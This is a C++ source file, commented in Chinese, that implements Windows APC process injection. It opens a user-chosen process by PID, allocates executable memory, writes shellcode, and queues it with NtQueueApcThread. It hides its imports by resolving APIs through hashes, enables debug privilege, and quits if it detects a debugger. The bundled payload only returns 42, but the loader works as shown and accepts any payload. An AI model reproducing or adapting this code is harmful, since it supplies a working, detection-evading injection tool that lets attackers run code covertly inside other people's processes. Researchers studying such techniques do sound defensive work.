#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <limits>
#include <vector>

#include "encapsulation\EnableDebugPrivilege.h"
#include "encapsulation\IsDebugging.h"
#include "encapsulation\Hash.h"
#include "encapsulation\GetProcAddress.h"

// ============================================================
// 区段 1：Payload
// ------------------------------------------------------------
// x64: B8 2A 00 00 00 C3   -> mov eax,42 ; ret
// x86: APC 例程是 __stdcall，被调用者需清 3 个参数(12字节)栈，
//      必须用 ret 0xC (C2 0C 00)，裸 C3 会让线程栈错位。
// ============================================================
static unsigned char g_ShellCode[] = {
    0xB8, 0x2A, 0x00, 0x00, 0x00,
    0xC3
};
// x86 变体：static unsigned char g_ShellCode[] = { 0xB8,0x2A,0,0,0, 0xC2,0x0C,0x00 };
static const SIZE_T g_ShellCodeSize = sizeof(g_ShellCode);


// ============================================================
// 区段 2：API 表（哈希解析，幂等）
// ============================================================
typedef HANDLE   (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID   (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI *pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL     (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE   (WINAPI *pOpenThread)(DWORD, BOOL, DWORD);
typedef BOOL     (WINAPI *pCloseHandle)(HANDLE);
typedef HANDLE   (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL     (WINAPI *pThread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL     (WINAPI *pThread32Next)(HANDLE, LPTHREADENTRY32);

// 不重复定义 SDK 已有的 PS_APC_ROUTINE，第二参直接收 PVOID 地址
typedef NTSTATUS (NTAPI  *pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);

struct ApiFuncs {
    pOpenProcess              OpenProcess              = nullptr;
    pVirtualAllocEx           VirtualAllocEx           = nullptr;
    pVirtualFreeEx            VirtualFreeEx            = nullptr;
    pWriteProcessMemory       WriteProcessMemory       = nullptr;
    pOpenThread               OpenThread               = nullptr;
    pCloseHandle              CloseHandle              = nullptr;
    pCreateToolhelp32Snapshot CreateToolhelp32Snapshot = nullptr;
    pThread32First            Thread32First            = nullptr;
    pThread32Next             Thread32Next             = nullptr;
    pNtQueueApcThread         NtQueueApcThread         = nullptr;

    bool valid = false;
};

static ApiFuncs g_Api{};
static bool     g_ApiResolved = false;

__declspec(noinline) static bool ResolveApis(){
    if (g_ApiResolved) return g_Api.valid;
    g_ApiResolved = true;

    const DWORD hKernel32 = NHash32::hash("kernel32.dll");
    const DWORD hNtdll    = NHash32::hash("ntdll.dll");

    ApiFuncs f;
    f.OpenProcess              = (pOpenProcess)              GetProcAddressEx(hKernel32, NHash32::hash("OpenProcess"));
    f.VirtualAllocEx           = (pVirtualAllocEx)           GetProcAddressEx(hKernel32, NHash32::hash("VirtualAllocEx"));
    f.VirtualFreeEx            = (pVirtualFreeEx)            GetProcAddressEx(hKernel32, NHash32::hash("VirtualFreeEx"));
    f.WriteProcessMemory       = (pWriteProcessMemory)       GetProcAddressEx(hKernel32, NHash32::hash("WriteProcessMemory"));
    f.OpenThread               = (pOpenThread)               GetProcAddressEx(hKernel32, NHash32::hash("OpenThread"));
    f.CloseHandle              = (pCloseHandle)              GetProcAddressEx(hKernel32, NHash32::hash("CloseHandle"));
    f.CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot) GetProcAddressEx(hKernel32, NHash32::hash("CreateToolhelp32Snapshot"));
    f.Thread32First            = (pThread32First)            GetProcAddressEx(hKernel32, NHash32::hash("Thread32First"));
    f.Thread32Next             = (pThread32Next)             GetProcAddressEx(hKernel32, NHash32::hash("Thread32Next"));
    f.NtQueueApcThread         = (pNtQueueApcThread)         GetProcAddressEx(hNtdll,    NHash32::hash("NtQueueApcThread"));

    f.valid = f.OpenProcess && f.VirtualAllocEx && f.VirtualFreeEx
           && f.WriteProcessMemory && f.OpenThread && f.CloseHandle
           && f.CreateToolhelp32Snapshot && f.Thread32First && f.Thread32Next
           && f.NtQueueApcThread;

    g_Api = f;
    return g_Api.valid;
}


// ============================================================
// 区段 3：线程枚举
// ============================================================
static std::vector<DWORD> EnumThreadIds(DWORD pid)
{
    std::vector<DWORD> tids;
    if (!g_Api.valid) return tids;

    HANDLE hSnap = g_Api.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return tids;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);

    if (g_Api.Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid)
                tids.push_back(te.th32ThreadID);
        } while (g_Api.Thread32Next(hSnap, &te));
    }

    g_Api.CloseHandle(hSnap);
    return tids;
}

__declspec(noinline) static DWORD GetFirstThreadId(DWORD pid)
{
    std::vector<DWORD> tids = EnumThreadIds(pid);
    return tids.empty() ? 0 : tids.front();
}


// ============================================================
// 区段 4：注入原子步骤
// ============================================================
enum class InjectStatus : int {
    Ok = 0,
    ApiNotReady,
    OpenProcessFailed,
    AllocFailed,
    WriteFailed,
    NoThreadFound,
    OpenThreadFailed,
    QueueApcFailed,
};

struct InjectResult {
    InjectStatus status        = InjectStatus::Ok;
    DWORD        code          = 0;       // Win32 错误码 / NTSTATUS
    DWORD        threadId      = 0;
    LPVOID       remoteAddress = nullptr;

    bool ok() const { return status == InjectStatus::Ok; }
};

static const char* StatusText(InjectStatus s){
    switch (s) {
    case InjectStatus::Ok:                return "成功";
    case InjectStatus::ApiNotReady:       return "函数表未解析";
    case InjectStatus::OpenProcessFailed: return "OpenProcess 失败";
    case InjectStatus::AllocFailed:       return "VirtualAllocEx 失败";
    case InjectStatus::WriteFailed:       return "WriteProcessMemory 失败";
    case InjectStatus::NoThreadFound:     return "未找到目标线程";
    case InjectStatus::OpenThreadFailed:  return "OpenThread 失败";
    case InjectStatus::QueueApcFailed:    return "NtQueueApcThread 失败";
    }
    return "未知状态";
}

// 步骤 4.1：打开目标进程
__declspec(noinline) static HANDLE OpenTargetProcess(DWORD pid, DWORD* err)
{
    HANDLE h = g_Api.OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!h && err) *err = GetLastError();
    return h;
}

// 步骤 4.2：远程申请内存
__declspec(noinline) static bool AllocateRemote(HANDLE hProcess, SIZE_T size,
                                                LPVOID* out, DWORD* err)
{
    LPVOID p = g_Api.VirtualAllocEx(hProcess, NULL, size,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!p) {
        if (err) *err = GetLastError();
        return false;
    }
    *out = p;
    return true;
}

// 步骤 4.3：写入 shellcode
__declspec(noinline) static bool WriteRemote(HANDLE hProcess, LPVOID dst,
                                             const void* src, SIZE_T size, DWORD* err)
{
    if (g_Api.WriteProcessMemory(hProcess, dst, src, size, NULL))
        return true;
    if (err) *err = GetLastError();
    return false;
}

// 步骤 4.4：向指定线程投递 APC
enum class QueueStatus { Ok, OpenThreadFailed, NtStatusFailed };

__declspec(noinline) static QueueStatus QueueApcToThread(DWORD tid, LPVOID routine, DWORD* code)
{
    HANDLE hThread = g_Api.OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    if (!hThread) {
        if (code) *code = GetLastError();
        return QueueStatus::OpenThreadFailed;
    }

    NTSTATUS st = g_Api.NtQueueApcThread(hThread, routine, NULL, NULL, NULL);
    g_Api.CloseHandle(hThread);

    if (code) *code = (DWORD)st;
    return (st >= 0) ? QueueStatus::Ok : QueueStatus::NtStatusFailed;  // NT_SUCCESS
}

// 步骤 4.5：回收远程内存（失败路径）
static void ReleaseRemote(HANDLE hProcess, LPVOID p)
{
    if (p && hProcess)
        g_Api.VirtualFreeEx(hProcess, p, 0, MEM_RELEASE);
}


// ============================================================
// 区段 5：注入编排
// ============================================================
__declspec(noinline) static InjectResult InjectApc(DWORD pid, bool freeRemoteOnFailure = true)
{
    InjectResult r;

    if (!g_Api.valid) {
        r.status = InjectStatus::ApiNotReady;
        return r;
    }

    // ---- 打开进程 ----
    HANDLE hProcess = OpenTargetProcess(pid, &r.code);
    if (!hProcess) {
        r.status = InjectStatus::OpenProcessFailed;
        return r;
    }

    // ---- 申请 + 写入 ----
    LPVOID remote = nullptr;
    if (!AllocateRemote(hProcess, g_ShellCodeSize, &remote, &r.code)) {
        r.status = InjectStatus::AllocFailed;
        g_Api.CloseHandle(hProcess);
        return r;
    }
    r.remoteAddress = remote;

    if (!WriteRemote(hProcess, remote, g_ShellCode, g_ShellCodeSize, &r.code)) {
        r.status = InjectStatus::WriteFailed;
        if (freeRemoteOnFailure) ReleaseRemote(hProcess, remote);
        g_Api.CloseHandle(hProcess);
        return r;
    }

    // ---- 选线程 ----
    r.threadId = GetFirstThreadId(pid);
    if (r.threadId == 0) {
        r.status = InjectStatus::NoThreadFound;
        if (freeRemoteOnFailure) ReleaseRemote(hProcess, remote);
        g_Api.CloseHandle(hProcess);
        return r;
    }

    // ---- 投递 APC ----
    QueueStatus qs = QueueApcToThread(r.threadId, remote, &r.code);
    if (qs != QueueStatus::Ok) {
        r.status = (qs == QueueStatus::OpenThreadFailed)
                 ? InjectStatus::OpenThreadFailed
                 : InjectStatus::QueueApcFailed;
        if (freeRemoteOnFailure) ReleaseRemote(hProcess, remote);
        g_Api.CloseHandle(hProcess);
        return r;
    }

    // 成功后不释放远程页：APC 仍在队列中，等目标线程 alertable 才派发
    g_Api.CloseHandle(hProcess);
    r.status = InjectStatus::Ok;
    return r;
}


// ============================================================
// 区段 6：入口
// ============================================================
static bool PromptPid(DWORD& pid)
{
    std::cout << "[*] 请输入目标进程 PID: ";
    if (std::cin >> pid && pid != 0)
        return true;

    std::cin.clear();
    std::cin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
    return false;
}

int main()
{
    // ---- 环境准备 ----
    EnableDebugPrivilege();

    if (IsDebuggingA()) {
        std::cerr << "[-] 检测到调试器" << std::endl;
        return 0;
    }

    // ---- API 预热 ----
    if (!ResolveApis()) {
        std::cerr << "[-] 函数解析失败" << std::endl;
        return 1;
    }
    std::cout << "[+] 所有函数解析成功" << std::endl;

    // ---- 目标输入 ----
    DWORD pid = 0;
    if (!PromptPid(pid)) {
        std::cerr << "[-] PID 非法" << std::endl;
        return 1;
    }

    // ---- 执行注入 ----
    InjectResult r = InjectApc(pid);

    if (!r.ok()) {
        std::cerr << "[-] " << StatusText(r.status)
                  << "，code=0x" << std::hex << r.code << std::dec << std::endl;
        if (r.remoteAddress)
            std::cerr << "[-] 远程地址: 0x" << std::hex
                      << (uintptr_t)r.remoteAddress << std::dec << std::endl;
        system("pause");
        return 1;
    }

    std::cout << "[+] Shellcode 写入: 0x" << std::hex
              << (uintptr_t)r.remoteAddress << std::dec << std::endl;
    std::cout << "[+] 目标线程 ID: " << r.threadId << std::endl;
    std::cout << "[+] APC 插入成功" << std::endl;
    std::cout << "[*] 提示：APC 仅在目标线程进入 alertable 等待"
                 "(SleepEx / WaitForSingleObjectEx / MsgWait…ALERTABLE) 时派发。"
              << std::endl;

    system("pause");
    return 0;
}